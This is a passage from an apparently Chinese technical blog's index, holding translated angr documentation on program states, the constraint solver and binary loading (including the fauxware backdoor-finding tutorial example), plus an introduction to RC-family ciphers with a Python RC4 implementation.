不要直接去看这些状态的约束——我们刚经过的分支涉及到strcmp的结果，这是一个难以用符号方式模拟的函数，由此产生的约束非常复杂。 我们模拟的程序从标准输入获取数据，默认情况下将其视为无限的符号数据流。为了进行约束求解，我们需要stdin实际内容的引用，我们稍后将会讨论我们的文件和输入子系统是如何工作的，但现在，只需使用state.posix.stdin.load(0, state.posix.stdin.size)取得到目前为止从标准输入读取的所有内容构成的bitvector。 \u003e\u003e\u003e input_data = state1.posix.stdin.load(0, state1.posix.stdin.size) \u003e\u003e\u003e state1.solver.eval(input_data, cast_to=bytes) b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00\\x00\\x00' \u003e\u003e\u003e state2.solver.eval(input_data, cast_to=bytes) b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x00\\x80N\\x00\\x00 \\x00\\x00\\x00\\x00' 正如你所见，为了进入state1路径，你必须将后门字符串“SOSNEAKY”作为密码，为了进入state2路径，你必须输入后门字符串以外的内容。z3打印了数十亿个符合的字符串之一。 Fauxware是第一个angr成功进行符号执行的程序，时间在2013年。通过使用angr找到它的后门，你正在参与一个伟大的传统，你已经对如何通过符号执行从二进制程序中获取有意义信息有了基本的了解！ ","date":"2022-09-14","objectID":"/2022/09/program_state/:2:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"预设状态（State Presets） 在此之前，当我们操作state时，都会使用project.factory.entry_state()来创建一个新的状态，这只是angr可使用的几个构造函数之一： .blank_state()构造一个空白状态，它的大部分数据都未初始化，访问未初始化的数据时，会得到一个不带约束的符号值 .entry_state()构造一个在main函数入口点的状态 .full_init_state()构造一个准备好在main函数入口点之前运行的初始化程序执行。例如：共享库构造函数或预设初始化器，完成这些后，它将跳转到程序入口点 .call_state()构造一个准备好执行给定函数的状态 你可以通过以下构造函数参数自定义状态 上述所有构造函数都可以使用addr参数指定开始执行的确切地址 如果你在符号执行过程中需要命令行参数或环境变量，可以使用args列表或env字典传递参数，只有entry_state和full_init_state可使用。这些参数中的值可以是字符串或bitvector，都会被序列化为state中的args和env。默认的args是个空列表，所以哪怕你的程序只需要argv[0]，你都需要自己提供 如果你需要使用符号化的argc，你可以将一个bitvector传递给argc参数，只有entry_state和full_init_state可使用。但是要小心，如果你这样做，你要添加一个约束：argc的值不能大于args的数量 要使用call state，你应该使用.call_state(addr, arg1, arg2, ……)，addr是你要调用的函数的地址，argN是该函数的第n个参数，无论是python 整数、字符串、列表还是bitvector都可以。如果你想得到内存中指向一个对象的实际的指针，你应该将其包装在PointerWrapper中，即angr.PointerWrapper(\"point to me!\")，这个API结果可能存在问题，我们正在努力改善 使用call_state时若要指定函数的调用约定，可以使用cc参数传递一个SimCC实例。一般情况下angr会选择一个合适的方式作为默认值，但在特殊情况下，需要你手动指定 在这些构造函数中还有更多的选项可以使用，更多详细信息，请参阅docs on the project.factory object (an AngrObjectFactory) ","date":"2022-09-14","objectID":"/2022/09/program_state/:3:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"内存底层接口（Low level interface for memory） state.mem接口便于从内存中加载特定类型的数据，但是当你想要对一段内存进行原样的加载和存储时，它就显的十分繁琐。事实上，state.mem的底层使用了state.memory，state.memory表示一个填充了bitvector的平坦地址空间。你可以使用state.memory.load(addr, size)和state.memory.store(addr, val)直接操作内存： \u003e\u003e\u003e s = proj.factory.blank_state() \u003e\u003e\u003e s.memory.store(0x4000, s.solver.BVV(0x0123456789abcdef0123456789abcdef, 128)) \u003e\u003e\u003e s.memory.load(0x4004, 6) # 加载大小以字节为单位 \u003cBV48 0x89abcdef0123\u003e 正如你所见，数据以大端序进行加载和存储，因为state.memory的主要目的是加载没有附加语义的存储数据。但是，如果你想把它们转化为小端序，你可以设置endness为little-endian。endness的取值应该是archinfo包中Endness枚举量之一。此外，正在分析程序的字节序可以从arch.memory_endness得到，例如state.arch.memory_endness \u003e\u003e\u003e import archinfo \u003e\u003e\u003e s.memory.load(0x4000, 4, endness=archinfo.Endness.LE) \u003cBV32 0x67452301\u003e 还有一个用于寄存器访问的底层接口state.registers，使用方法与state.memory完全相同，但解释它的行为需要深入了解angr用于无缝处理多架构的抽象。简单来说它是一个寄存器文件，寄存器和偏移量的映射在archinfo中定义 ","date":"2022-09-14","objectID":"/2022/09/program_state/:4:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"状态选项（State Options） 你可以使用一些状态选项对angr的内部进行很多小调整，这些调整在某些情况下会优化angr的行为，而在其他情况下会有所损害。 在每个SimState对象上，都有一组启用的选项（state.options）。每个选项（实际上只是一个字符串）都以某种微小的方式控制angr执行引擎的行为。可以在附录中找到完整的选项列表及其默认值。你可以使用angr.options访问并向state添加某个选项。单个选项一般以大写字母命名，但也有一些你可能希望捆绑在一起使用的常用对象分组，以小写字母命名。 无论用任何构造函数创建SimState时，你都可以使用参数add_options和remove_options传递从默认值修改的选项。 # 例如: 启用lazy_solves, 这个选项会尽可能减少检查状态是否满足约束 # 对此设置的更改会影响此行之后所有由此状态创建的后继状态 \u003e\u003e\u003e s.options.add(angr.options.LAZY_SOLVES) # 创建一个state并且开启lazy_solves \u003e\u003e\u003e s = proj.factory.entry_state(add_options={angr.options.LAZY_SOLVES}) # 创建一个不启用simplification选项的新状态 \u003e\u003e\u003e s = proj.factory.entry_state(remove_options=angr.options.simplification) ","date":"2022-09-14","objectID":"/2022/09/program_state/:5:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"状态插件（State Plugins） 除了刚刚讨论的各种选项之外，存储在SimState中的所有内容实际上都存储在附加到state的各种插件中。到目前为止，我们讨论的几乎每个state属性（memory、registers、mem、regs、solver等等）都是可插拔的。这种设计允许代码模块化，以及模拟状态的其他方面轻松实现新型数据存储，或者使用其他插件替代实现。 例如，普通的memory插件模拟了一个平坦的内存空间，但是分析时可以选择“abstract memory”插件，它使用地址的替代数据类型来模拟独立于地址的自由浮动内存映射，来提供state.memory。另一方面，插件可以降低代码复杂度：state.memory和state.registers实际上是同一个插件的两个不同实例，因为寄存器也是用地址空间模拟的。 ","date":"2022-09-14","objectID":"/2022/09/program_state/:6:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"全局插件（The global plugin） state.globals是一个非常简单的插件：它实现了python dict相关的接口，允许你在state上存储任意数据。 ","date":"2022-09-14","objectID":"/2022/09/program_state/:7:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"历史插件（The history plugin） state.history是一个非常重要的插件，用于存储符号执行过程中所采用路径的历史数据。它实际上是一些历史节点的链表，每一个节点代表一轮执行，你可以用state.history.parent.parent……来遍历这个列表 为了让你更方便地访问历史数据，它还提供了针对某些值好用的迭代器。通常，这些值存储在history.recent_NAME，它们的迭代器可以通过history.NAME访问。例如，for addr in state.history.bbl_addrs: print hex(addr)会打印出经过的二进制基本块的地址，而state,history.recent_bbl_addrs是最近一步执行的基本块的列表，state.history.parent.recent_bbl_addrs是上一步执行的基本块列表。如果你需要快速访问这些值的平坦（flat）列表，可以使用.hardcopy，例如state.history.bbl_addrs.hardcopy。但请记住，基于索引的访问是在迭代器上实现的 以下是存储在历史记录中的一些值的简要说明： history.descriptions是对每一轮执行的字符串描述列表 history.bbl_addrs是执行的基本块地址的列表。每轮执行可能不止一个，并且并非所有地址都对应于二进制代码，有些可能是hook的SimProcedures的地址 history.jumpkinds是历史中每个控制流处理的列表，以VEX枚举字符串形式展现 history.jump_guards是历史中遇到的每个分支的条件列表 history.events是执行期间发生的“有趣事件”的列表，例如符号跳转条件的存在、程序弹出消息框、退出代码终止程序执行 history.actions通常为空，但如果你在state中添加state.options.refs，它将记录程序执行时内存、寄存器和临时值被访问的日志 ","date":"2022-09-14","objectID":"/2022/09/program_state/:8:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"调用栈插件（The callstack plugin） angr会跟踪模拟程序的调用栈过程。在每条调用指令触发时，都会在调用栈的记录顶部添加一个帧（frame），而每当栈指针下降到最顶层帧以下时，就会弹出一个帧。这使angr能稳定地存储当前模拟函数的数据。 和历史记录类似，调用栈记录也是由节点构成的链表，但angr并没有提供对节点内容的迭代器，取而代之的，你可以直接遍历state.callstack来获取每个活动帧的调用栈帧，按从最新到最旧排序，如果你想获取顶层帧，那么直接使用state.callstack callstack.func_addr是当前正在执行的函数地址 callstack.call_site_addr是调用当前函数的基本块的地址 callsack.stack_ptr是从当前函数开始的栈指针的值 callstack.ret_addr是当前函数的返回地址 ","date":"2022-09-14","objectID":"/2022/09/program_state/:9:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"更多关于I/O的信息：文件、文件系统、网络套接字（More about I/O: Files, file systems, and network sockets） 请参阅Working with File System, Sockets, and Pipes获取详细的文档 ","date":"2022-09-14","objectID":"/2022/09/program_state/:10:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"复制和合并（Copying and Merging） state支持快速复制，以便你探索不同的分支 \u003e\u003e\u003e proj = angr.Project('/bin/true') \u003e\u003e\u003e s = proj.factory.blank_state() \u003e\u003e\u003e s1 = s.copy() \u003e\u003e\u003e s2 = s.copy() \u003e\u003e\u003e s1.mem[0x1000].uint32_t = 0x41414141 \u003e\u003e\u003e s2.mem[0x1000].uint32_t = 0x42424242 state也可以合并在一起 # 合并会返回一个元组，第一个元素是合并状态 # 第二个元素是描述状态标志的符号变量 # 第三个元素是一个布尔值，描述是否进行过合并 \u003e\u003e\u003e (s_merged, m, anything_merged) = s1.merge(s2) # 现在这是一个可以解析为“AAAA”或“BBBB”的表达式 \u003e\u003e\u003e aaaa_or_bbbb = s_merged.mem[0x1000].uint32_t TODO：描述合并的限制 ","date":"2022-09-14","objectID":"/2022/09/program_state/:11:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Crypto"],"content":"RC algorithms RC algorithms 是由Ron Rivest设计的一系列加密算法，在逆向中常见到的RC4属于其中的一个，下面引自维基百科 RC1 was never published. RC2 was a 64-bit block cipher developed in 1987. RC3 was broken before ever being used. RC4 is a stream cipher. RC5 is a 32/64/128-bit block cipher developed in 1994. RC6, a 128-bit block cipher based heavily on RC5, was an AES finalist developed in 1997. ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:0:0","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"RC4 ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:0","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"算法简介 RC4是一种流加密算法。所谓流加密，其核心思想是通过一系列算法生成较为随机的一串密钥流，然后将明文与密钥流异或得到密文，显然地，把密文再与密钥流异或即得到明文 RC4获得随机密钥流依靠特定的密钥key打乱S盒，换句话说，key一定时，生成的密钥流是确定的 ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:1","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"算法属性 RC4是一种流加密算法 密钥长度可变 加解密使用同样密钥，属于对称加密算法 ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:2","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"算法过程 初始化S盒，一般是256个字节 使用密钥key打乱S盒 根据s盒生成密钥流 明文/密文与密钥流异或得到密文/明文 ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:3","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"python实现 main函数 def main(): key = [1, 2, 3, 4, 5] # 准备一些变量 key_len = len(key) plain = \"i_am_plain_text\" plain_len = len(plain) cipher = [0] * plain_len s = [i for i in range(256)] # 初始化s盒 rc4_init(s, key, key_len) # 使用key打乱s盒 key_stream = rc4_generate_keystream(s[:], plain_len) # 生成密钥流 for i in range(plain_len): # 逐字节异或加密 cipher[i] = ord(plain[i]) ^ key_stream[i] 使用key打乱s盒 def rc4_init(s, key, key_len): j = 0 for i in range(256): j = (j + s[i] + key[i%key_len])%256 tmp = s[i] s[i] = s[j] s[j] = tmp 生成密钥流（这里是按明文长度生成 def rc4_generate_keystream(s, length): i = 0 j = 0 key_stream = [] while length: i = (i + 1) % 256 # 可以保证每256次循环后s盒中的每个元素至少被交换一次 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp key_stream.append(s[(s[i] + s[j]) % 256]) length -= 1 return key_stream ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:4","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"逆向算法特征 256字节、值分别是0-255的S盒 整个算法被分成两部分 打乱S盒时j = (j + s[i] + key[i%key_len])%256并不常见 ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:5","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"RC2 RC2可作为DES算法的建议替代算法。 它的输入和输出都是64比特。 密钥的长度是从1字节到128字节可变，但1998年的实现是8字节。此算法被设计为可容易地在16位的微处理器上实现。 to be continued… ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:2:0","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"RC5 RC5是一种因简洁著称的对称分组加密算法。它是参数可变的分组密码算法，三个可变的参数是：分组大小、密钥大小和加密轮数。 在此算法中使用了三种运算：异或、加和循环。 to be continued… ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:3:0","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"RC6 RC6是基于RC5的128位块加密算法，实际上是由3个参数确定的一个加密算法族。 to be continued… ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:4:0","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Angr"],"content":"Solver Engine angr的强大之处并不在于它是个模拟器，而在于它能够使用符号变量进行符号执行。与其说一个变量对应一个具体的数值，不如说一个变量对应着一个符号，实际上只是一个名字。使用这些变量执行算术运算将产生一棵操作树（在编译原理中称为抽象语法树或AST）。AST可以转化成SMT求解器（如z3）的约束，以便提出诸如“给定经过此造作序列之后的输出，输入必须是什么？”之类的问题，这一节里，你将学会如何用angr来回答这个问题。 ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:0:0","tags":["reverse","angr"],"title":"angr文档翻译（四）Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"使用Bitvectors（Working with Bitvectors） 让我们加载得到project和state，开始我们的数字游戏。 \u003e\u003e\u003e import angr, mokeyhex \u003e\u003e\u003e proj = angr.Project('/bin/true') \u003e\u003e\u003e state = proj.factory.entry_state() bitvector只是一个比特序列，在进行算术时和有界整数有相同的语义。让我们试着创建几个bitvector # 具有具体值1和100的64位bitvector \u003e\u003e\u003e one = state.solver.BVV(1, 64) \u003e\u003e\u003e one \u003cBV64 0x1\u003e \u003e\u003e\u003e one_hundred = state.solver.BVV(100, 64) \u003e\u003e\u003e one_hundred \u003cBV64 0x64\u003e # 创建一个带有具体值9的27位bitvector \u003e\u003e\u003e weird_nine = state.solver.BVV(9, 27) \u003e\u003e\u003e weird_nine \u003cBV27 0x9\u003e 正如你所见，你可以使用任何长度的比特序列构造bitvector，你也可以用它们进行数学运算： \u003e\u003e\u003e one + one_hundred \u003cBV64 0x65\u003e # 你可以使用python整数来构造bitvector,它们将被强制转换为适当的类型 \u003e\u003e\u003e one_hundred + 0x100 \u003cBV64 0x164\u003e # 可以实现算法的正常语义适用 \u003e\u003e\u003e one_hundred - one*200 \u003cBV64 0xffffffffffffff9c\u003e 你不能把one和weird_nine相加，对不同长度的bitvector执行操作会产生类型错误。但是你可以扩展weird_nine，使它具有合适的位数： \u003e\u003e\u003e weird_nine.zero_extend(64 - 27) \u003cBV64 0x9\u003e \u003e\u003e\u003e one + weird_nine.zero_extend(64 - 27) \u003cBV64 0xa\u003e zero_extend会在bitvector的左侧填充给定数量的0进行扩展。你也可以使用sign_extend填充最高位获得bitvector的副本，将bitvector的语义转化为二进制补码是有符号整数 现在，让我们引入一些符号 # 创建一个名为‘x'的bitvector,长度为64位 \u003e\u003e\u003e x = state.solver.BVS(\"x\", 64) \u003e\u003e\u003e x \u003cBV64 x_9_64\u003e \u003e\u003e\u003e y = state.solver.BVS(\"y\", 64) \u003e\u003e\u003e y \u003cBV64 y_10_64\u003e x和y是符号变量，有点像你在代数中学习使用的变量。值得注意的是，你所提供的符号变量名会自动附加一个递增计数器，你可以对它们进行任意数量的算术运算，但你并不会得到一个数字，而是会得到一个AST \u003e\u003e\u003e x + one \u003cBV64 x_9_64 + 0x1\u003e \u003e\u003e\u003e (x + one) / 2 \u003cBV64 (x_9_64 + 0x1) / 0x2\u003e \u003e\u003e\u003e x - y \u003cBV64 x_9_64 - y_10_64\u003e 从技术上讲，x和y甚至都是AST——任何一个bitvector都是一棵操作树，即使这棵树只有一层深。为了理解这一点，让我们学习如何处理AST 每个AST都有.op和.args两个属性，op是一个字符串，命名正在执行的操作，args是参与操作所使用的数值。除非op是BVV或BVS（或其他一些），否则args是所有其他AST，树会以BVV或BVS终止。 \u003e\u003e\u003e tree = (x + 1) / (y + 2) \u003e\u003e\u003e tree \u003cBV64 (x_9_64 + 0x1) / (y_10_64 + 0x2)\u003e \u003e\u003e\u003e tree.op '__floordiv__' \u003e\u003e\u003e tree.args (\u003cBV64 x_9_64 + 0x1\u003e, \u003cBV64 y_10_64 + 0x2\u003e) \u003e\u003e\u003e tree.args[0].op '__add__' \u003e\u003e\u003e tree.args[0].args (\u003cBV64 x_9_64\u003e, \u003cBV64 0x1\u003e) \u003e\u003e\u003e tree.args[0].args[1].op 'BVV' \u003e\u003e\u003e tree.args[0].args[1].args (1, 64) 从这里开始，我们将使用bitvector一词来指代任何最高操作产生bitvector的AST.我们可以通过AST表示其他数据类型，包括浮点数和我们即将看到的布尔值。 ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:1:0","tags":["reverse","angr"],"title":"angr文档翻译（四）Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"符号约束（Symbolic Constraints） 在任何两个类型类似的AST之间执行比较操作，将产生一个新的AST,一个符号布尔值，而不是bitvector。 \u003e\u003e\u003e x == 1 \u003cBool x_9_64 == 0x1\u003e \u003e\u003e\u003e x == one \u003cBool x_9_64 == 0x1\u003e \u003e\u003e\u003e x \u003e 2 \u003cBool x_9_64 \u003e 0x2\u003e \u003e\u003e\u003e x + y == one_hundred + 5 \u003cBool (x_9_64 + y_10_64) == 0x69\u003e \u003e\u003e\u003e one_hundred \u003e 5 \u003cBool True\u003e \u003e\u003e\u003e one_hundred \u003e -5 \u003cBool False\u003e 你可能会注意到，默认情况下的比较是无符号的，上面最后一个示例中的-5被强制转换为\u003cBV64 0xfffffffffffffffb\u003e，所以绝对不小于100。如果你想进行有符号数的比较，你可以使用one)hundred.SGT(-5)（signed greater-than）。本章末提供了完整的指令列表 这个例子也说明了使用angr的一个重要注意事项——你不应该在if和while语句的条件中使用变量之间的比较，因为答案可能并没有一个具体的真值。即使有一个真值，if one \u003e one_hundred将会引发一个异常。你应该使用solver.is_true和solver.is_false在不执行约束求解的情况下测试真值是true还是false \u003e\u003e\u003e yes = one == 1 \u003e\u003e\u003e no = one == 2 \u003e\u003e\u003e maybe = x == y \u003e\u003e\u003e state.solver.is_true(yes) True \u003e\u003e\u003e state.solver.is_false(yes) False \u003e\u003e\u003e state.solver.is_true(no) False \u003e\u003e\u003e state.solver.is_false(no) True \u003e\u003e\u003e state.solver.is_true(maybe) False \u003e\u003e\u003e state.solver.is_false(maybe) False ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:2:0","tags":["reverse","angr"],"title":"angr文档翻译（四）Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"约束求解（Constraint Solving） 你可以将任何布尔符号表达式视为对于符号变量有效值的断言，然后对符号表达式求值求解出符号变量的有效值。 用例子来解释可能会更清晰： \u003e\u003e\u003e state.solver.add(x \u003e y) \u003e\u003e\u003e state.solver.add(y \u003e 2) \u003e\u003e\u003e state.solver.add(10 \u003e x) \u003e\u003e\u003e state.solver.eval(x) 4 通过将这些约束添加到状态中，我们强制约束求解器返回的有效值必须满足这些条件。如果你运行这些代码，可能会得到不同的x值，但这个值肯定大于3（因为x\u003ey且y\u003e2）且小于10。更进一步来说，如果你使用state.solver.eval(y)来求解y的值，你会发现得到的y值和x值相同。换句话说，如果你不在两次查询之间添加其他约束，那么两次查询得到的结果是一致的。 根据以上所说，现在我们很容易能解决开头的问题——根据确定的输出找到合适的输入。 # 获取一个没有约束的新状态 \u003e\u003e\u003e state = proj.factory.entry_state() \u003e\u003e\u003e input = state.solver.BVS('input', 64) \u003e\u003e\u003e operation = (((input + 4) * 3) \u003e\u003e 1) + input \u003e\u003e\u003e output = 200 \u003e\u003e\u003e state.solver.add(operation == output) \u003e\u003e\u003e state.solver.eval(input) 0x3333333333333381 请注意这种求解方式仅适用于对于bitvector的运算，如果我们在整数域上运算，就会发现无解。 如果我们添加冲突或矛盾的约束，这样就没有有效值能满足约束，state将变为unsatisfiable（即unsat），你可以使用state.satisfiable()检查state的可满足性。 \u003e\u003e\u003e state.solver.add(input \u003c 2**32) \u003e\u003e\u003e state.satisfiable() False 你还可以计算更复杂的表达式，或者多个变量的表达式。 # 新的state \u003e\u003e\u003e state = proj.factory.entry_state() \u003e\u003e\u003e state.solver.add(x - y \u003e= 4) \u003e\u003e\u003e state.solver.add(y \u003e 0) \u003e\u003e\u003e state.solver.eval(x) 5 \u003e\u003e\u003e state.solver.eval(y) 1 \u003e\u003e\u003e state.solver.eval(x + y) 6 由此我们可以看出，eval是将bitvector转化为python格式的通用方法，转换的过程中同时确保state不会改变，这也是我们使用eval将bitvector转化为python整数的原因。 另外注意，尽管x和y是使用旧状态创建的，但仍可以在新状态下使用，变量不依赖于某一种状态，可以自由存在。 ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:3:0","tags":["reverse","angr"],"title":"angr文档翻译（四）Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"浮点数（Floating point numbers） z3支持IEEE754浮点数标准，所以angr也支持浮点数操作。与一般浮点数相比主要的区别是，angr里的浮点数没有宽度的概念，而有一个排序（sort）的概念。你可以使用FPV和FPS来创建浮点值和浮点符号。 # 新的state \u003e\u003e\u003e state = proj.factory.entry_state() \u003e\u003e\u003e a = state.solver.FPV(3.2, state.solver.fp.FSORT_DOUBLE) \u003e\u003e\u003e a \u003cFP64 FPV(3.2, DOUBLE)\u003e \u003e\u003e\u003e b = state.solver.FPS('b', state.solver.fp.FSORT_DOUBLE) \u003e\u003e\u003e b \u003cFP64 FPS('FP_b_0_64', DOUBLE)\u003e \u003e\u003e\u003e a + b \u003cFP64 fpAdd('RNE', FPV(3.2, DOUBLE), FPS('FP_b_0_64', DOUBLE))\u003e \u003e\u003e\u003e a + 4.4 \u003cFP64 FPV(7.6000000000000005, DOUBLE)\u003e \u003e\u003e\u003e b + 2 \u003c 0 \u003cBool fpLT(fpAdd('RNE', FPS('FP_b_0_64', DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))\u003e 这里有一些东西需要说明——对于初学者来说，浮点数的pretty-printing并不那么好看。但大多数操作实际上都有第三个参数，当你使用二元运算符时被隐式添加的——进位与舍位的模式（rounding mode）。IEEE754规范支持多种舍入模式（如舍入到最近位、舍入到0位、舍入到正位等），所以z3必须支持它们。如果你想指定舍入模式，请显示使用fp操作（如solver.fpAdd），并将舍入模式之一（solver.fp.RM_*)作为第一个参数 浮点数相关的约束和求解和一般bitvector以相同的方式方式工作，不同的是eval操作返回一个浮点数。 \u003e\u003e\u003e state.solver.add(b + 2 \u003c 0) \u003e\u003e\u003e state.solver.add(b + 2 \u003e -1) \u003e\u003e\u003e state.solver.eval(b) -2.4999999999999996 这很好，但有时我们需要直接将浮点数表示为bitvector。你可以使用raw_to_bv和raw_to_fp将一般的bitvector解释为浮点数或将浮点数转化为一般的bitvector \u003e\u003e\u003e a.raw_to_bv() \u003cBV64 0x400999999999999a\u003e \u003e\u003e\u003e b.raw_to_bv() \u003cBV64 fpToIEEEBV(FPS('FP_b_0_64', DOUBLE))\u003e \u003e\u003e\u003e state.solver.BVV(0, 64).raw_to_fp() \u003cFP64 FPV(0.0, DOUBLE)\u003e \u003e\u003e\u003e state.solver.BVS('x', 64).raw_to_fp() \u003cFP64 fpToFP(x_1_64, DOUBLE)\u003e 这些转换保持了每一位比特值（bit-pattern）不变，就像你将float指针转化为int指针一样。但是如果你想尽可能保留该值，就像将float类型值转化为int值一样，你可以使用val_to_fp和val_to_bv。由于浮点数的浮点特性，这些方法必须将目标值的大小或排序（sort）作为参数。 \u003e\u003e\u003e a \u003cFP64 FPV(3.2, DOUBLE)\u003e \u003e\u003e\u003e a.val_to_bv(12) \u003cBV12 0x3\u003e \u003e\u003e\u003e a.val_to_bv(12).val_to_fp(state.solver.fp.FSORT_FLOAT) \u003cFP32 FPV(3.0, FLOAT)\u003e 这些方法还可以使用有符号参数，指定源或目标bitvector的符号。 ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:4:0","tags":["reverse","angr"],"title":"angr文档翻译（四）Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"更多求解方法（More Solving Methods） eval只会返回给你一个可能的有效值，但是，如果你想要不止一个呢？ 如果你想确保有效值唯一怎么办？求解器为你提供了几种常见的求解方法 solver.eval(expression)会返回一个可能的有效值 solver.eval_one(expression)会返回一个有效值，若有效值不唯一将会抛出一个错误 solver.eval_upto(expression, n)会返回至多n个可能的有效值，如果可能的有效值不足n个，则返回所有有效值 solver.eval_atleast(expression, n)会返回n个可能的有效值，如果可能的有效值不足n个，则会抛出一个错误 solver.eval_exact(expression, n)会返回n个可能的有效值，若可能的有效值数量不是n个，则会抛出一个错误 solver.min(expression)会返回最小的可能有效值 solver.max(expression)会返回最大的可能有效值 另外，以上所有求解方法都可以采用以下关键字参数 extra_constraints可以以一个元组的形式传递约束条件。这些约束将被考虑仅求解中，但不会被加入state中 cast_to可以传递一个数据类型，指定结果转换成某种形式，目前，这个参数只能是int或bytes，例如：state.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=bytes)将会返回b'ABCD' ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:5:0","tags":["reverse","angr"],"title":"angr文档翻译（四）Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"总结（Summary） 你已经学到了很多！阅读本节后，你应该能够创建和操作bitvector、布尔值、浮点值构造操作树，然后查询附加在某个state的约束求解器，来获得约束条件下的可能解。希望到此为止，你能了解AST表示计算以及约束求解器的强大功能。 在附录中，你可以找到应用于AST的所有操作的参考，当你需要时可以快速查阅。 ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:6:0","tags":["reverse","angr"],"title":"angr文档翻译（四）Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"Loading a Binary 在之前的文档中，你仅仅对angr的加载功能进行了一个简单的使用——你加载了/bin/true，然后在没有动态连接库的情况下再次加载了它。你也看到了一些angr提供给你的指令比如proj.factory。现在，我们将深入这些指令，了解它们之间的差别以及它们能提供给你什么信息。 我们简要的介绍了angr的二进制加载组件CLE（CLE Loads Everything），它常被用来获取二进制程序（以及它的依赖库），并且可以将这些信息以易于使用的形式传递给angr的其他组件 ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:0:0","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"加载器（The Loader） 我们以加载example/fauxware/fauxware为例，对如何与加载器交互进行一个深入的探究。 \u003e\u003e\u003e import angr, mokeyhex \u003e\u003e\u003e proj = angr.Project('example/fauxware/fauxware') \u003e\u003e proj.loader \u003cLoaded fauxware, maps [0x400000:0x5008000]\u003e ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:1:0","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"加载的对象（Loaded Objects） CLE加载器（cle.loader）是被加载的二进制对象的一个集合，被加载并映射到单独的内存空间。每个二进制对象都可以被相对应的加载器后端加载（cle.Backend的子类）。例如用cle.ELF加载ELF文件 在内存中也有与加载的二进制程序无关的对象。比如用来提供线程本地存储支持的对象，用来提供未解析符号的外部对象externs oobject。 你可以使用loader.all_objects来查看CLE加载的所有对象，还可以通过特定命令查看一些更有针对性的分类 # 所有加载的对象 \u003e\u003e\u003e proj.loader.all_projects [\u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e, \u003cELF Object libc-2.23.so, maps 